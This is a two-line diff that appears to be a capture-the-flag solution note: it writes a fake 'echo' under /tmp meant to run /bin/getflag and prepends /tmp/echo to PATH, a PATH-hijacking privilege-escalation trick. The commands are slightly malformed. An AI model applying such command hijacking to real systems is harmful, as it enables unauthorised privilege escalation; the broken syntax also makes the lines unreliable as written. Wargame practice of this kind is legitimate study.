@@ -1,0 +1,2 @@
+vim /tmp/echo (/bin/getflag)
+export PATH=/tmp/echo:$PATH
